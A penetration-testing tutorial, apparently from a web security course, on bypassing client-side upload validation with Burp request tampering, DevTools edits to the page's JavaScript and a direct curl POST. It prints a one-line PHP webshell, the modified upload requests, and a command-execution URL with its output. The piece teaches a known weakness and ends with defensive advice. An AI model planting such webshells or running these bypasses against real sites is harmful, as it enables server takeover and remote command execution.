## Bypassing Client-Side Upload Validation

Client-side validation is the weakest possible form of upload restriction because any code running in the browser is entirely under the attacker's control. The server has no involvement in the validation decision, which means bypassing it requires no server interaction at all.

The telltale sign of purely client-side validation is that selecting a disallowed file triggers an error message without the page sending any HTTP request. If the Network tab in DevTools shows no outbound request when the error appears, the validation is entirely front-end and trivially bypassed.

***

## Method 1: Intercept and Modify the Upload Request

The most reliable bypass works at the HTTP layer and completely sidesteps whatever the browser does. The approach is to upload a legitimate image first to understand the request structure, then replay that request with the payload substituted in.

**Step 1:** Configure Burp Suite as your browser proxy and upload a valid image normally. The captured request will look like this:

```http
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="uploadFile"; filename="profile.png"
Content-Type: image/png

PNG file bytes here...
-----------------------------1234567890--
```

**Step 2:** In Burp's Intercept or Repeater, modify two fields:

```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
```

Change `filename="profile.png"` to `filename="shell.php"` and replace the image binary data with the PHP webshell. The `Content-Type` header can remain `image/png` since the back-end may not validate it at this stage.

**Step 3:** Forward the modified request. If the back-end has no server-side validation, you receive a success response and the shell is live at the upload path.

This method works because the client-side JavaScript validation never runs again once you are replaying a captured request. The browser's validation fired when you selected the original image, but Burp intercepts the HTTP request after that decision has already been made.

***

## Method 2: Disable the Validation in the Browser

If you prefer not to use a proxy, you can edit the front-end code directly in the browser's DevTools. This is a one-time temporary change that lasts until the page is refreshed, which is all you need.

**Locate the validation function:**

Open the Page Inspector (Ctrl+Shift+C), click on the upload button or file input element, and find the `onchange` attribute in the highlighted HTML:

```html
<input type="file" name="uploadFile" id="uploadFile" 
       onchange="checkFile(this)" 
       accept=".jpg,.jpeg,.png">
```

Two things are blocking you here: the `accept` attribute limits the file picker dialog, and `onchange="checkFile(this)"` fires the validation function on file selection.

**Inspect the function in the Console (Ctrl+Shift+K):**

```javascript
function checkFile(File) {
    var extension = File.files[0].name.split('.').pop().toLowerCase();
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    }
}
```

The function checks the file extension and disables the submit button if it is not an image type.

**Remove the validation entirely:**

Double-click on `checkFile(this)` in the Inspector and delete it. Optionally also remove `accept=".jpg,.jpeg,.png"` to make the file picker show all files by default:

```html
<!-- Before -->
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

<!-- After editing in DevTools -->
<input type="file" name="uploadFile" id="uploadFile">
```

Now selecting and uploading `shell.php` proceeds without any validation firing. After upload, inspect the profile image source to find the upload path:

```html
<img src="/profile_images/shell.php" class="profile-image">
```

***

## Confirming the Bypass Worked

Both methods succeed only if the back-end also has no validation. After upload, test execution with a harmless command first:

```
http://target.com/profile_images/shell.php?cmd=id
```

Expected output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

If the server returns raw PHP source code instead of output, the file was uploaded but the server is not executing PHP from that directory, either because the uploads folder is configured as static-only, or because the file was renamed with a safe extension server-side despite accepting the upload.

***

## Why Client-Side Validation Provides Zero Security

The fundamental problem is trust. Client-side validation assumes the browser is an honest participant in the transaction. It is not. The entire validation chain can be bypassed with:

| Bypass Method | Time Required | Technical Skill |
|--------------|---------------|----------------|
| Burp request modification | Under 2 minutes | Minimal |
| DevTools HTML editing | Under 1 minute | Minimal |
| curl direct POST | 30 seconds | Basic |
| Python requests script | 2 minutes | Basic |

The `curl` direct upload is worth knowing as the fastest possible bypass:

```bash
# Skip the browser entirely, send the shell directly
curl -X POST http://target.com/upload.php \
     -F "uploadFile=@shell.php;type=image/png" \
     -F "submit=Upload"
```

This sends `shell.php` with a spoofed `Content-Type` of `image/png` directly to the server, bypassing every browser-side control in a single command. Client-side validation is useful for improving user experience by giving immediate feedback before a request is sent, but it must always be accompanied by identical validation on the server side.
